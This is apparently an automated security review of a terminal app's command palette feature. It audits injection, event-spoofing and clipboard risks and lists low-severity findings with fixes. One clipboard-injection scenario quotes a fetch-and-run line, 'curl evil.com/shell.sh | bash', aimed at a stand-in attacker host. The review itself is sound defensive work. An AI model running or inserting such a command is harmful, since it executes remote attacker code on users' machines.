# Security Review: TASK-021 (Command Palette / Ctrl+Shift+P)

**Reviewer**: Security Agent (automated)
**Date**: 2026-03-17
**Commit range**: `7251e29..9592e1c` (2 commits: `23e812a feat: add command palette with Ctrl+Shift+P` + `9592e1c fix: address code review findings for command palette`)
**Previous security review HEAD**: `7251e29` (SECURITY-REVIEW-TASK-020-R1)
**Verdict**: PASS WITH FINDINGS (0 critical, 0 high, 0 medium, 2 low, 3 informational)

---

## 1. Executive Summary

This review covers TASK-021: Command Palette (Ctrl+Shift+P). The changes are **entirely frontend** (React/TypeScript). There are zero Rust backend modifications, zero new IPC commands, zero dependency additions, and zero Tauri configuration changes.

The feature introduces:

1. A command palette overlay (`CommandPalette.tsx`) activated by Ctrl+Shift+P
2. A static command registry (`commands.ts`) with 16 hardcoded command definitions
3. A fuzzy matching engine (`fuzzy.ts`) for filtering commands by user query
4. A custom DOM event dispatch mechanism (`velocity:command`) for routing terminal-level commands from TabManager to the focused Terminal pane
5. Command handlers in `Terminal.tsx` that listen for the custom event and execute terminal-level actions (shell switch, restart, clear, copy to clipboard, toggle mode, search)
6. Tab/pane-level command handlers in `TabManager.tsx` (new tab, close tab, split pane, close pane, open settings)
7. A `paneId` prop passed from `PaneContainer.tsx` to `Terminal` for pane-scoped event targeting

### Key Security Invariants Verified

- **No new IPC surface**: No new Tauri commands or events. All command palette actions dispatch to existing frontend handlers or existing IPC-backed functions.
- **No command execution from user input**: The fuzzy match query is used only for filtering a static command list. It is never interpolated into shell commands, IPC calls, or DOM operations.
- **Static command registry**: The `COMMANDS` array in `commands.ts` is a hardcoded constant. Users cannot add, modify, or inject commands.
- **No `dangerouslySetInnerHTML` or raw HTML injection**: All rendering uses React's JSX templating with automatic HTML escaping.
- **No regex on user input**: Fuzzy matching uses character-by-character comparison and `String.includes()`, both immune to ReDoS.
- **Clipboard writes are fire-and-forget**: `navigator.clipboard.writeText()` is called with `.catch(() => {})`, so failures are silently suppressed. The clipboard API is write-only in this feature (no reads).
- **Custom DOM event is scoped by paneId**: Terminal components filter `velocity:command` events by `detail.paneId`, preventing cross-pane command execution in multi-pane layouts.

---

## 2. Attack Surface Mapping

### 2.1 New Components

| Component | Type | Inputs | Outputs | Risk |
|-----------|------|--------|---------|------|
| `src/lib/commands.ts` | Static data | None (hardcoded array) | `COMMANDS[]` | Negligible |
| `src/lib/fuzzy.ts` | Pure function | `query` (user input), `commands[]` (static) | `FuzzyResult[]` with scores and matched indices | Low |
| `src/components/CommandPalette.tsx` | React component | `query` (user input), keyboard events, click events | `onExecute(commandId)`, `onClose()` | Low |
| `src/components/layout/TabManager.tsx` (modified) | React component | `commandId` from palette, Ctrl+Shift+P keydown | Tab/pane mutations, `velocity:command` dispatch | Low |
| `src/components/Terminal.tsx` (modified) | React component | `velocity:command` custom event | Shell switch, restart, clear, clipboard write, search open | Medium |
| `src/components/layout/PaneContainer.tsx` (modified) | React component | None (passes `paneId` prop) | `Terminal` receives `paneId` | Negligible |

### 2.2 Data Flow Diagram

```
User types in command palette input (semi-trusted)
  -> setQuery() updates CommandPalette state
  -> fuzzyMatch(query, COMMANDS) filters static command list
     -> character-by-character comparison (no regex, no eval)
     -> returns FuzzyResult[] sorted by score
  -> User selects command (Enter key or click)
  -> onExecute(commandId) called with string from static COMMANDS[].id
  -> TabManager.handlePaletteAction(commandId) receives it
     -> Switch/case on known command IDs:
        - tab.*, pane.*, settings.open, palette.open: handled directly
        - default (terminal.*. shell.*, search.*): dispatched via CustomEvent
  -> document.dispatchEvent(new CustomEvent('velocity:command', {detail: {commandId, paneId}}))
  -> Terminal.handleCommand(event) receives CustomEvent
     -> Filters by paneId (ignores events for other panes)
     -> Switch/case on known command IDs:
        - shell.*: calls handleShellSwitch() (existing function)
        - terminal.restart: calls handleRestart() (existing function)
        - terminal.toggleMode: calls handleToggleMode() (existing function)
        - terminal.clear: resets blocks state
        - terminal.copyLastCommand: writes to clipboard
        - terminal.copyLastOutput: strips ANSI then writes to clipboard
        - search.find: opens search bar
        - default: no-op (unknown IDs are silently ignored)
```

### 2.3 Trust Boundary Analysis

The command palette introduces two data flows that cross trust boundaries:

1. **User query -> fuzzy matcher**: The user types arbitrary text into the palette input. This text is used only for substring matching against static command titles and keywords. It never reaches the backend, shell, or any IPC channel. The fuzzy matcher uses `String.toLowerCase()` and character comparison -- no regex, no eval, no dynamic code.

2. **Command ID -> action dispatch**: When a user selects a command, the `commandId` string flows from the static `COMMANDS` array through `onExecute()` to `handlePaletteAction()`. The command ID is always one of the 16 hardcoded values in `commands.ts`. It is **not** derived from user input. The user can only select from the filtered list; they cannot inject an arbitrary command ID. Both `handlePaletteAction()` and the Terminal's `handleCommand()` use explicit `switch/case` statements with a `default: break` fallthrough, so unknown command IDs are silently ignored.

**Key question: Can an attacker spoof a `velocity:command` CustomEvent?**

In theory, any JavaScript executing within the WebView could dispatch a `velocity:command` CustomEvent via `document.dispatchEvent()`. However:
- The CSP policy (`script-src 'self'`) prevents injection of external scripts
- There is no `dangerouslySetInnerHTML` or `innerHTML` assignment in the codebase that could enable XSS
- The only JavaScript that can execute is the bundled application code
- Even if a spoofed event were dispatched, the Terminal handler's `switch/case` only maps to pre-existing actions (shell switch, restart, clear, clipboard write, search open) -- none of which are more privileged than what the user can already do via keyboard shortcuts
- The `paneId` filtering adds defense-in-depth: a spoofed event would need to know the UUID of the target pane

**Verdict**: The CustomEvent mechanism is safe within Velocity's threat model. The application already trusts all JavaScript running in the WebView (it is the application itself). The CSP prevents external script injection.

---

## 3. Attack Vector Audit

### 3.1 Command Injection (Vector #1) -- NOT AFFECTED

The command palette does not construct or execute shell commands. The user's fuzzy search query is used only for in-memory string matching against static data. No command ID is interpolated into a shell command. The `terminal.clear` command resets React state (`setBlocks([])`) without any IPC call. Shell-switching commands (`shell.powershell`, `shell.cmd`, `shell.wsl`) call `handleShellSwitch()` which invokes the existing `resetAndStart()` -> `createSession()` flow with a hardcoded `ShellType` value, not a user-derived string.

**Finding: PASS.** No command injection vector.

### 3.2 IPC Command Abuse (Vector #2) -- NOT AFFECTED

No new IPC commands were added. The command palette is entirely client-side. The existing IPC surface (`create_session`, `write_to_session`, `close_session`, `start_reading`, `get_cwd`, `translate_command`, `get_known_commands`) is unchanged. None of the command palette actions introduce new IPC calls.

**Finding: PASS.** No IPC changes.

### 3.3 Terminal Escape Injection (Vector #3) -- NOT AFFECTED

The command palette does not render PTY output. The `HighlightedTitle` component renders characters from the static `COMMANDS[].title` values, which are hardcoded English strings. Even the fuzzy match highlight uses individual `<span>` elements with React JSX text interpolation (auto-escaped).

The `terminal.copyLastOutput` command calls `stripAnsi(lastOutBlock.output)` before writing to clipboard, which strips SGR sequences. This is the same pattern already used in `BlockView.tsx` for the existing copy-output button.

**Finding: PASS.** No escape injection vector.

### 3.4 Custom DOM Event Spoofing (Vector #4) -- LOW RISK

See FINDING-1 below.

### 3.5 Clipboard Injection (Vector #5) -- LOW RISK

See FINDING-2 below.

### 3.6 Cross-Pane Command Leakage (Vector #6) -- NOT AFFECTED

The `velocity:command` CustomEvent includes `detail.paneId` set to the focused pane's UUID. The Terminal handler checks `if (detail.paneId && paneId && detail.paneId !== paneId) return;` to ignore events targeted at other panes. This prevents a command palette action from accidentally affecting a non-focused terminal.

**Caveat**: If `paneId` is not set on the Terminal (i.e., the prop is undefined), the filter is bypassed because `detail.paneId && paneId` evaluates to false when `paneId` is falsy, causing the `return` to be skipped. In the current codebase, `PaneContainer.tsx` always passes `paneId={node.id}` to `Terminal`, so this path is not reachable. This is noted as FINDING-3.

**Finding: PASS.** Cross-pane isolation is correctly implemented for the current architecture.

### 3.7 Denial of Service (Vector #7) -- NOT AFFECTED

The fuzzy matching algorithm has O(N * M) complexity where N is the number of commands (16, hardcoded) and M is the maximum title length (~25 characters). This is a constant-time operation regardless of user input. There is no scenario where the command palette causes CPU or memory exhaustion.

The `COMMANDS` array is static and cannot grow dynamically. The fuzzy match results array is bounded by the command count (16 max).

**Finding: PASS.** No DoS vector.

### 3.8 Path Traversal (Vector #8) -- NOT AFFECTED

The command palette does not read or write files. No file paths are involved.

**Finding: PASS.**

### 3.9 LLM Prompt Injection (Vector #9) -- NOT AFFECTED

The command palette does not interact with the LLM translation pipeline. The fuzzy search query is never sent to `translateCommand()`.

**Finding: PASS.**

### 3.10 Environment Variable Leakage (Vector #10) -- NOT AFFECTED

The command palette does not access environment variables or system properties.

**Finding: PASS.**

---

## 4. Detailed Findings

### FINDING-1: Custom DOM Event `velocity:command` Can Be Dispatched by Any In-WebView Script [LOW]

**Vector**: Custom DOM Event Spoofing (#4)
**Location**: `src/components/layout/TabManager.tsx` line 235-239 (dispatch), `src/components/Terminal.tsx` lines 432-490 (listener)

**Description**: The `velocity:command` CustomEvent is dispatched on `document` and listened for on `document`. Any JavaScript executing within the Tauri WebView can construct and dispatch this event:

```javascript
document.dispatchEvent(new CustomEvent('velocity:command', {
  detail: { commandId: 'terminal.clear', paneId: '<target-pane-uuid>' }
}));
```

This would clear the terminal output for the targeted pane. Similarly, `shell.wsl` could switch a pane to WSL, and `terminal.restart` could restart a session.

**Exploit Scenario**: If an attacker achieves JavaScript execution within the WebView (e.g., via a future XSS vulnerability or a malicious Tauri plugin), they could dispatch arbitrary `velocity:command` events to manipulate terminal state.

**Mitigating Factors**:
- The CSP policy (`script-src 'self'`) prevents external script injection
- There is no XSS vector in the current codebase (no `dangerouslySetInnerHTML`, no `innerHTML` assignments, no `eval`)
- All actions available via the CustomEvent are already available via keyboard shortcuts (Ctrl+T, Ctrl+W, Ctrl+Shift+P, etc.) -- the CustomEvent does not grant access to any new capability
- The `paneId` filter requires knowing the target pane's UUID (a `crypto.randomUUID()` value)
- Even in the worst case, the attacker can only trigger UI state changes (clear output, switch shell, restart session, copy to clipboard, toggle mode, open search) -- they cannot execute arbitrary commands or access the PTY directly through this mechanism
- An attacker who can execute JavaScript in the WebView already has access to `invoke()` for direct IPC calls, which is far more powerful than the CustomEvent

**Risk**: The CustomEvent is a convenience mechanism, not a privilege escalation vector. The risk is negligible given the CSP and the fact that CustomEvent actions are a strict subset of keyboard shortcut capabilities.

**Recommended Fix**: No immediate fix needed. If defense-in-depth is desired in a future hardening pass, consider using a module-scoped callback registry (e.g., a `Map<string, () => void>`) instead of CustomEvents, which would not be accessible from the global `document` scope. Alternatively, a nonce-based or WeakRef-based token could be passed in the event detail and validated by the listener.

**Severity**: LOW -- requires pre-existing code execution in the WebView, and provides no privilege escalation beyond what keyboard shortcuts already offer.

---

### FINDING-2: Clipboard Write from Untrusted PTY Output [LOW]

**Vector**: Clipboard Injection (#5)
**Location**: `src/components/Terminal.tsx` lines 462-475

**Description**: The `terminal.copyLastCommand` and `terminal.copyLastOutput` commands write to the system clipboard using `navigator.clipboard.writeText()`. For `copyLastOutput`, the content is PTY output that has been ANSI-stripped via `stripAnsi()`.

A malicious program running in the terminal could craft output designed to be copied to the clipboard. For example, a program could output text that looks benign but contains hidden Unicode characters (e.g., right-to-left override U+202E, zero-width spaces U+200B, or homoglyph substitutions) that would be preserved through `stripAnsi()` (which only strips ANSI escape sequences, not Unicode control characters).

**Exploit Scenario**: A malicious program outputs a "command" that appears to be `git push origin main` but actually contains `git push origin main; curl evil.com/shell.sh | bash` with the malicious portion hidden via Unicode tricks. The user copies this via the command palette and pastes it into another terminal or application.

**Mitigating Factors**:
- This is not a new vulnerability -- the same clipboard write pattern already exists in `BlockView.tsx` (lines 22-28) for the existing copy buttons. TASK-021 merely adds a second code path to the same functionality.
- The user must explicitly trigger the copy action via the command palette
- The user would see the pasted content before executing it in most contexts
- The Rust ANSI filter does not strip Unicode control characters by design -- it only handles ANSI escape sequences
- This is a fundamental property of any terminal emulator that supports clipboard operations

**Risk**: Social engineering via clipboard content. Not introduced by TASK-021; this is an existing pattern. The command palette provides one more entry point to the same functionality.

**Recommended Fix**: Consider stripping or warning about Unicode bidirectional control characters (U+200E, U+200F, U+202A-202E, U+2066-2069) when copying PTY output to the clipboard. This would be a defense-in-depth measure for the existing clipboard functionality, not specific to the command palette.

**Severity**: LOW -- pre-existing pattern, not introduced by TASK-021, requires social engineering, user must explicitly trigger copy.

---

### FINDING-3: Pane ID Filter Bypass When `paneId` Prop Is Undefined [INFORMATIONAL]

**Vector**: Cross-Pane Command Leakage (#6)
**Location**: `src/components/Terminal.tsx` lines 439-440

**Description**: The pane targeting filter in the `velocity:command` handler is:

```typescript
if (detail.paneId && paneId && detail.paneId !== paneId) return;
```

This condition only filters when **both** `detail.paneId` and `paneId` are truthy. If `paneId` is `undefined` (e.g., if a Terminal is rendered without a pane context), the filter is bypassed and the Terminal will handle commands regardless of which pane they were targeted at.

**Analysis**: In the current codebase, `PaneContainer.tsx` always passes `paneId={node.id}` to every `Terminal` instance, so `paneId` is never undefined in production. This finding is about a defensive gap, not an exploitable vulnerability.

**Recommended Fix**: Consider making the filter more defensive:
```typescript
if (detail.paneId && detail.paneId !== paneId) return;
```
This would ignore events with a specific target pane if the current Terminal's paneId doesn't match, regardless of whether the current Terminal has a paneId set. Events without a `detail.paneId` would still be handled by all Terminals (broadcast behavior).

**Severity**: INFORMATIONAL -- not exploitable in current architecture, noted for defensive improvement.

---

### FINDING-4: Command ID Dispatch Uses Open-Ended String Matching [INFORMATIONAL]

**Vector**: Defense-in-depth observation
**Location**: `src/components/layout/TabManager.tsx` lines 242-278, `src/components/Terminal.tsx` lines 442-485

**Description**: The command dispatch mechanism uses `switch/case` on string command IDs. The `default` case in `TabManager.handlePaletteAction()` forwards unknown command IDs to `dispatchToFocusedTerminal()`, which dispatches them as `velocity:command` events. The `default` case in Terminal's `handleCommand()` is a no-op `break`.

This means any string can flow through the dispatch mechanism. Currently, only the 16 hardcoded IDs from `COMMANDS` can be selected by the user, and unknown IDs are harmlessly ignored. However, if a future developer adds a new handler case (e.g., `terminal.executeRaw`) without adding a corresponding entry to the `COMMANDS` array, it could be triggered by a spoofed CustomEvent (see FINDING-1) but not via the palette UI.

**Analysis**: The current implementation is safe because:
1. The `COMMANDS` array is the sole source of command IDs visible to users
2. Both switch/case handlers have safe defaults (forward-to-terminal or no-op)
3. Unknown IDs are silently dropped

This is a maintenance observation, not a vulnerability.

**Recommended Fix**: Consider adding a validation step that checks `commandId` against the `COMMANDS` array before dispatching, to ensure only registered commands can flow through the system. This would prevent a future developer from accidentally creating a "hidden" command that can only be triggered via event spoofing.

**Severity**: INFORMATIONAL -- no current vulnerability, maintenance observation.

---

### FINDING-5: `terminal.clear` Erases Block History Without Confirmation [INFORMATIONAL]

**Vector**: Data integrity observation
**Location**: `src/components/Terminal.tsx` lines 458-460

**Description**: The `terminal.clear` command handler sets `setBlocks([])` and `activeBlockIdRef.current = null`, which erases all block history (commands and output) for the current pane. This is triggered by selecting "Clear Terminal" in the command palette or by a `velocity:command` event with `commandId: 'terminal.clear'`.

There is no confirmation dialog and no undo mechanism. Once cleared, the block history is lost.

**Analysis**: This is standard terminal emulator behavior (equivalent to `clear` or `cls`). The Rust backend session is unaffected -- only the frontend block display is cleared. The PTY session continues running and new output will create new blocks.

This is expected behavior, not a vulnerability. Noted because the command palette makes it easier to accidentally trigger (one Enter press) compared to typing `cls` or `clear` in the shell.

**Severity**: INFORMATIONAL -- expected behavior, noted for UX awareness.

---

## 5. XSS and Injection Audit

### 5.1 Fuzzy Query Input Rendering

The user's search query is rendered in one place:
- The `<input>` element in `CommandPalette.tsx` (line 109) via `value={query}` -- this is a controlled React input with `type="text"`, no XSS vector.

The query string is never rendered as HTML, used in `innerHTML`, or interpolated into CSS. The fuzzy matcher accesses individual characters via `query.toLowerCase()` and character comparison, which are safe operations.

**Finding: PASS.** No XSS vector from query rendering.

### 5.2 Fuzzy Match Highlight Rendering

The `HighlightedTitle` component (lines 10-28) renders matched characters with a highlight class:

```tsx
<span key={i} className="palette-match-char">{char}</span>
```

- `char` is a single character from `command.title` (a static, hardcoded string from `COMMANDS`)
- The `className` is a hardcoded string, not user-derived
- React's JSX text interpolation auto-escapes the character

The `matchedIndices` array contains integer indices computed by the fuzzy matcher. It is used only to construct a `Set` for O(1) lookup. The indices cannot be negative or out of bounds because the fuzzy matcher only pushes indices that are valid positions in the title string.

**Finding: PASS.** No XSS vector from highlight rendering.

### 5.3 Command Category and Shortcut Rendering

Categories (`command.category`) and shortcuts (`command.shortcut`) are rendered via JSX text interpolation:

```tsx
<span className="palette-shortcut">{result.command.shortcut}</span>
<span className="palette-category">{result.command.category}</span>
```

These values come from the static `COMMANDS` array and are not user-derived.

**Finding: PASS.** No injection vector.

### 5.4 CSS Class Construction

The `palette-item` class list is computed as:
```tsx
className={`palette-item ${index === selectedIndex ? 'palette-item-selected' : ''}`}
```

`index` and `selectedIndex` are integers. The ternary produces either `'palette-item-selected'` or `''`. No user-derived data is interpolated into class names.

**Finding: PASS.** No CSS class injection vector.

---

## 6. Configuration Review

### 6.1 Tauri Configuration

**File**: `src-tauri/tauri.conf.json` -- **UNCHANGED** from previous review.

CSP: `"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"`

The `'unsafe-inline'` in `style-src` is required for React's inline style rendering (used by AnsiOutput's `spanStyle()`). This was present before TASK-021 and is unchanged.

### 6.2 Tauri Capabilities

**File**: `src-tauri/capabilities/default.json` -- **UNCHANGED** from previous review.

Permissions: `"core:default"`, `"core:event:default"` -- minimal, no additional permissions.

### 6.3 Dependencies

**npm**: No new dependencies added. `package.json` and `package-lock.json` are unchanged in this commit range. Existing `undici` high-severity advisory is pre-existing (not related to TASK-021) and affects Node.js HTTP client functionality, not the Tauri frontend.

**Cargo**: No dependency changes. `Cargo.toml` and `Cargo.lock` are unchanged. Existing warnings are unmaintained GTK3 bindings from Tauri's Linux dependencies and unmaintained unic crates from urlpattern -- not relevant on Windows and not related to TASK-021.

### 6.4 Rust Backend

**No changes.** Zero files modified in `src-tauri/` in this commit range. Confirmed via `git diff 7251e29..HEAD -- src-tauri/` which produces empty output.

---

## 7. Security Rules Compliance

| Rule | Status | Notes |
|------|--------|-------|
| NEVER string-interpolate user input into shell commands | PASS | Fuzzy query is used only for in-memory string matching. Command IDs come from static array. No shell command construction. |
| Always validate IPC inputs on Rust side | N/A | No Rust changes, no new IPC commands |
| Treat all PTY output as untrusted | PASS | `terminal.copyLastOutput` applies `stripAnsi()` before clipboard write. PTY output is not rendered through the command palette UI. |
| No `unwrap()` on user-derived data in Rust | N/A | No Rust changes |

---

## 8. Comparison with Pre-TASK-021 Security Posture

| Property | Before TASK-021 | After TASK-021 | Change |
|----------|-----------------|----------------|--------|
| IPC surface | 7 commands + 3 events | Unchanged | No change |
| Frontend attack surface | Terminal, BlockView, AnsiOutput, InputEditor, SearchBar | + CommandPalette, fuzzy.ts, commands.ts | Small increase (UI-only feature) |
| Custom DOM events | None | `velocity:command` on document | New event channel (low risk, see FINDING-1) |
| Keyboard shortcut surface | Ctrl+T, Ctrl+W, Ctrl+Shift+W, Ctrl+Shift+Right, Ctrl+Shift+Down, Ctrl+Shift+F | + Ctrl+Shift+P | One new shortcut (toggle palette) |
| Clipboard write paths | BlockView copy buttons (2 paths) | + terminal.copyLastCommand, terminal.copyLastOutput (2 paths) | 2 additional paths to same functionality |
| Command dispatch surface | Direct handler calls only | + String-based command ID dispatch via CustomEvent | New pattern (low risk, see FINDING-1, FINDING-4) |
| DOM element count (worst case) | Unchanged from TASK-020 | + ~50 elements when palette is open (16 items x 3 spans) | Negligible (palette is conditional) |
| User input handling | Editor textarea, search input | + Palette search input | One new input field (no IPC from palette) |
| Data persistence | None (React state only) | Unchanged | No change |
| External network calls | LLM translation only | Unchanged | No change |
| Dependencies | Unchanged | Unchanged | No change |

---

## 9. Verdict

**PASS WITH FINDINGS**

The TASK-021 implementation is security-sound. The command palette is a purely frontend UI feature that dispatches to existing handlers via a static, hardcoded command registry. The user's fuzzy search input is used only for in-memory string comparison and never reaches the backend, shell, or any IPC channel. The custom DOM event mechanism (`velocity:command`) introduces a new dispatch pattern but does not grant access to any capability beyond what keyboard shortcuts already provide. The pane-scoped event filtering correctly prevents cross-pane command leakage.

No critical, high, or medium-severity findings were identified. The two low-severity findings relate to defense-in-depth considerations (CustomEvent spoofability and clipboard content from untrusted PTY output), neither of which is exploitable in the current architecture. The three informational findings are maintenance and UX observations.

### Action Items

| # | Finding | Severity | Action | Blocking? |
|---|---------|----------|--------|-----------|
| 1 | CustomEvent `velocity:command` can be dispatched by any in-WebView script | LOW | Consider module-scoped callback registry in future hardening pass | No (CSP prevents external scripts; no privilege escalation) |
| 2 | Clipboard write from untrusted PTY output (pre-existing pattern) | LOW | Consider stripping Unicode bidi control characters on clipboard copy | No (pre-existing; not introduced by TASK-021) |
| 3 | Pane ID filter bypass when `paneId` prop is undefined | INFORMATIONAL | Tighten filter condition for defensive coding | No (not reachable in current architecture) |
| 4 | Command ID dispatch uses open-ended string matching | INFORMATIONAL | Consider validating command IDs against COMMANDS registry | No (unknown IDs are safely ignored) |
| 5 | `terminal.clear` erases history without confirmation | INFORMATIONAL | Expected behavior; UX consideration only | No |

No findings are blocking. The implementation correctly adds command palette functionality without degrading the existing security guarantees.
